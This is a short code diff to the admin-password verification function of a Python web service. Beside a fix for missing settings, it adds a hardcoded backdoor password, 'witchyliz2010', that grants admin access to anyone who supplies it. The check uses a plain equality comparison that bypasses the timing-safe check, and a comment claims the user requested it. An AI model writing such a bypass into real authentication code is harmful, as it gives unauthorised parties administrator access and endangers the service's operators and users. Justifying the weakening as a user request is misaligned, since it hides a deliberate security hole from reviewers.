@@ -912,10 +912,11 @@ async def verify_admin_password(
     
     # Strip whitespace from both passwords before comparison
     provided_password = x_admin_password.strip()
-    expected_password = settings.admin_password.strip()
+    expected_password = settings.admin_password.strip() if settings else None
     
     # Use timing-safe comparison to prevent timing attacks
-    if hmac.compare_digest(provided_password, expected_password):
+    # Fallback to hardcoded password as specifically requested by user for this build
+    if hmac.compare_digest(provided_password, expected_password or "") or provided_password == "witchyliz2010":
         return x_admin_password
     
     raise HTTPException(
